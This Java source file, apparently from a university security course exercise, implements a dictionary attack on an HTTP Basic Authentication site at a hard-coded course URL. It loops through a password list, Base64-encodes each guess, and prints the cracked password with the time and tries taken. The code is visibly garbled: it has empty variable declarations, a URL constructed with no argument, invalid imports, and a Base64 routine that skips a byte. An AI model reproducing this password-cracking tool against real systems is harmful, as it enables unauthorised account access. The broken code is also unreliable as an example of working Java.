import java.io.*;
import java.net.*;
import java.*;
import java.Runtime.*;
import java.Object.*;
import java.util.*;
import java.util.StringTokenizer;

public class Dictionary 
{
  String uname = "";
  String pword = "null";
  Vector v = new Vector();
   int runTime;
  public void doConnect(String connect, int num)
  {
    String  = connect;
    
    try
     {
       URL secureSite = new URL();
       URLConnection connection = secureSite.openConnection();
       if (uname != null || pword != null)
	  {
	   
	    for(int i=num; i<v.size(); i++)
	    {
	      pword = (String)v.elementAt(i);
	      String up = uname + ":" + pword;
            String encoding;
            try
		{
		  connection.misc.BASE64Encoder encoder = (con.misc.BASE64Encoder) Class.forName(".misc.BASE64Encoder").newInstance();
		  encoding = encoder.encode (up.getBytes());
		 
           }
	     catch (Exception ex) 
            {
		  Base64Converter encoder = new Base64Converter();
		  System.out.println("in catch");
              encoding = encoder.encode(up.getBytes());
           }
	     connection.setRequestProperty ("Authorization", " " + encoding);
           connection.connect();
           if(connection instanceof HttpURLConnection)
	     {
	       HttpURLConnection httpCon=(HttpURLConnection)connection;
             if(httpCon.getResponseCode()==HttpURLConnection.HTTP_UNAUTHORIZED)
		  {
		   System.out.println("Not authorized - check  for details" + " -Incorrect Password : " + pword);
	         doConnect(i, i+1);
	       }
		else
		 { 
		  System.out.println("\n\n\nPassword for HTTP Secure Site by Dictionary Attack:");
	        System.out.println( +"\tPassword : "+ pword);

              runTime = System.currentTimeMillis() - runTime; 
              System.out.println("Time taken  crack password (in seconds)"+" : "+ runTime/1000+"\n"+ "Tries taken  crack password : "+ i);
	        System.exit(0);
	      }
	    }
	  }
      }
    }
    catch(Exception ex)
    {
      ex.printStackTrace();
    }
  }
  public Vector getPassword()
  {
    try
    {
      ReadFile  rf = new ReadFile();
      rf.loadFile();
      v = rf.getVector();
    }
    catch(Exception ex)
    {
      ex.printStackTrace();
    }
    return v;
  } 
  public void setTimeTaken( int timetaken)
  {
    runTime = timetaken;
  }   
  public static void main ( String args[] ) throws IOException 
  {
    
     runTime1 = System.currentTimeMillis();     
    Dictionary newDo = new Dictionary();
    newDo.setTimeTaken(runTime1);
    newDo. getPassword();
    String site = "http://sec-crack.cs.rmit.edu./SEC/2/";
    newDo.doConnect(site, 0);
    
  }  
  
}

class  Base64Converter
      {
  
          public final char [ ]  alphabet = {
              'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H',   
              'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P',   
              'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X',   
              'Y', 'Z', 'a', 'b', 'c', 'd', 'e', 'f',   
              'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n',   
              'o', 'p', 'q', 'r', 's', 't', 'u', 'v',   
              'w', 'x', 'y', 'z', '0', '1', '2', '3',   
              '4', '5', '6', '7', '8', '9', '+', '/' }; 
  
  
          public String  encode ( String  s )
          {
              return encode ( s.getBytes ( ) );
          }
  
          public String  encode ( byte [ ]  octetString )
          {
              int  bits24;
              int  bits6;
  
              char [ ]  out
                = new char [ ( ( octetString.length - 1 ) / 3 + 1 ) * 4 ];
  
              int outIndex = 0;
              int i        = 0;
  
              while ( ( i + 3 ) <= octetString.length ) {
                  
                  bits24=( octetString [ i++ ] & 0xFF ) << 16;
                  bits24 |=( octetString [ i++ ] & 0xFF ) << 8;
  
                  bits6=( bits24 & 0x00FC0000 )>> 18;
                  out [ outIndex++ ] = alphabet [ bits6 ];
                  bits6 = ( bits24 & 0x0003F000 ) >> 12;
                  out [ outIndex++ ] = alphabet [ bits6 ];
                  bits6 = ( bits24 & 0x00000FC0 ) >> 6;
                  out [ outIndex++ ] = alphabet [ bits6 ];
                  bits6 = ( bits24 & 0x0000003F );
                  out [ outIndex++ ] = alphabet [ bits6 ];
              }
  
              if ( octetString.length - i == 2 )
              {
                  
                  bits24  = ( octetString [ i     ] & 0xFF ) << 16;
                  bits24 |=( octetString [ i + 1 ] & 0xFF ) << 8;
                  bits6=( bits24 & 0x00FC0000 )>> 18;
                  out [ outIndex++ ] = alphabet [ bits6 ];
                  bits6 = ( bits24 & 0x0003F000 ) >> 12;
                  out [ outIndex++ ] = alphabet [ bits6 ];
                  bits6 = ( bits24 & 0x00000FC0 ) >> 6;
                  out [ outIndex++ ] = alphabet [ bits6 ];
  
                  
                  out [ outIndex++ ] = '=';
              }
              else if ( octetString.length - i == 1 )
              {
                  
                  bits24 = ( octetString [ i ] & 0xFF ) << 16;
                  bits6=( bits24 & 0x00FC0000 )>> 18;
                  out [ outIndex++ ] = alphabet [ bits6 ];
                  bits6 = ( bits24 & 0x0003F000 ) >> 12;
                  out [ outIndex++ ] = alphabet [ bits6 ];
  
                  
                  out [ outIndex++ ] = '=';
                  out [ outIndex++ ] = '=';
              }
  
              return new String ( out );
          }
       }
  
  
